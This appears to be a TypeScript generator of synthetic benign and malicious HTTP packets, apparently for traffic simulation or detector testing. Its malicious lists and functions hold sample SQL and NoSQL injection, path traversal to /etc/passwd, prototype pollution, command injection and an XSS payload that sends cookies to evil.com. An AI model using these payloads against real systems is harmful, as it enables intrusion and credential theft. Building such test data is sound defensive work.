/**
 * Generates realistic content for network packets
 * based on whether they're malicious or benign
 */

// HTTP methods
const httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];

// Benign endpoints
const benignEndpoints = [
  '/api/users',
  '/api/products',
  '/api/search',
  '/api/auth/login',
  '/api/auth/logout',
  '/api/profile',
  '/api/settings',
  '/health',
  '/status',
  '/metrics',
  '/api/dashboard',
  '/api/notifications',
  '/static/assets',
  '/api/events',
  '/api/comments',
];

// Malicious endpoints and patterns
const maliciousEndpoints = [
  '/admin/config',
  '/../../../etc/passwd',
  '/wp-admin/install.php',
  '/phpMyAdmin/setup.php',
  '/api/users?id=1%20OR%201=1',
  '/cgi-bin/bash',
  '/api/login?username=admin%27%20--',
  '/.env',
  '/config.php.bak',
  '/shell.php',
  '/api/exec?cmd=whoami',
  '/api/users/delete/*',
  '/actuator/env',
  '/server-status',
  '/api/auth/reset?email=*',
];

// User agents
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
  'Mozilla/5.0 (Linux; Android 12)',
];

// Malicious user agents
const maliciousUserAgents = [
  'sqlmap/1.4.7',
  'Nikto/2.1.6',
  'Nmap Scripting Engine',
  'masscan/1.3',
  'Mozilla/5.0 zgrab/0.x',
];

// HTTP headers
const headers = [
  'Content-Type: application/json',
  'Accept: */*',
  'Authorization: Bearer JWT',
  'X-Requested-With: XMLHttpRequest',
  'Referer: https://example.com',
];

// Malicious headers
const maliciousHeaders = [
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8)',
  "X-Forwarded-For: '; DROP TABLE users;--",
  'User-Agent: curl/7.68.0',
  'Cookie: session=1; sqlinjection=1\'OR\'1\'=\'1',
];

// JSON payloads for POST/PUT
const benignPayloads = [
  '{"username":"user","password":"********"}',
  '{"query":"product search"}',
  '{"id":123,"action":"view"}',
  '{"filters":{"category":"electronics"}}',
  '{"page":1,"limit":10}',
];

// Malicious payloads
const maliciousPayloads = [
  '{"username":"admin\' OR 1=1;--","password":"anything"}',
  '{"$where":"this.passwordHash == \'hash\'"}',
  '{"__proto__":{"polluted":"yes"}}',
  '{"username":"<script>alert(1)</script>"}',
  '{"query":"UNION SELECT * FROM users"}',
];

/**
 * Generate packet content based on whether it should be malicious or benign
 */
export function generatePacketContent(isMalicious: boolean): string {
  if (isMalicious) {
    return generateMaliciousPacket();
  } else {
    return generateBenignPacket();
  }
}

/**
 * Generate benign packet content
 */
function generateBenignPacket(): string {
  const method = httpMethods[Math.floor(Math.random() * httpMethods.length)];
  const endpoint = benignEndpoints[Math.floor(Math.random() * benignEndpoints.length)];
  const agent = userAgents[Math.floor(Math.random() * userAgents.length)];
  const header = headers[Math.floor(Math.random() * headers.length)];
  
  // For POST/PUT methods, include a payload
  let payloadContent = '';
  if (method === 'POST' || method === 'PUT') {
    const payload = benignPayloads[Math.floor(Math.random() * benignPayloads.length)];
    payloadContent = `\n${payload}`;
  }
  
  return `${method} ${endpoint} HTTP/1.1
Host: api.example.com
${header}
User-Agent: ${agent}${payloadContent}`;
}

/**
 * Generate malicious packet content
 */
function generateMaliciousPacket(): string {
  // Decide which type of malicious packet
  const maliciousType = Math.floor(Math.random() * 4);
  
  switch (maliciousType) {
    case 0: // SQL injection
      return generateSQLInjectionPacket();
    case 1: // Path traversal
      return generatePathTraversalPacket();
    case 2: // XSS attack
      return generateXSSPacket();
    case 3: // Command injection
      return generateCommandInjectionPacket();
    default:
      return generateSQLInjectionPacket();
  }
}

/**
 * Generate SQL injection attack packet
 */
function generateSQLInjectionPacket(): string {
  const method = 'POST';
  const endpoint = '/api/login';
  const agent = maliciousUserAgents[Math.floor(Math.random() * maliciousUserAgents.length)];
  
  return `${method} ${endpoint} HTTP/1.1
Host: api.example.com
Content-Type: application/json
User-Agent: ${agent}
{"username":"admin' OR '1'='1","password":"' OR '1'='1"}`;
}

/**
 * Generate path traversal attack packet
 */
function generatePathTraversalPacket(): string {
  const method = 'GET';
  const endpoint = maliciousEndpoints[Math.floor(Math.random() * 4)]; // First few are path traversal
  const agent = maliciousUserAgents[Math.floor(Math.random() * maliciousUserAgents.length)];
  
  return `${method} ${endpoint} HTTP/1.1
Host: api.example.com
User-Agent: ${agent}`;
}

/**
 * Generate XSS attack packet
 */
function generateXSSPacket(): string {
  const method = 'POST';
  const endpoint = '/api/comments';
  const agent = userAgents[Math.floor(Math.random() * userAgents.length)];
  
  return `${method} ${endpoint} HTTP/1.1
Host: api.example.com
Content-Type: application/json
User-Agent: ${agent}
{"comment":"<script>document.location='http://evil.com/cookie?'+document.cookie</script>"}`;
}

/**
 * Generate command injection attack packet
 */
function generateCommandInjectionPacket(): string {
  const method = 'GET';
  const endpoint = '/api/ping?host=127.0.0.1;cat /etc/passwd';
  const agent = maliciousUserAgents[Math.floor(Math.random() * maliciousUserAgents.length)];
  
  return `${method} ${endpoint} HTTP/1.1
Host: api.example.com
User-Agent: ${agent}`;
}
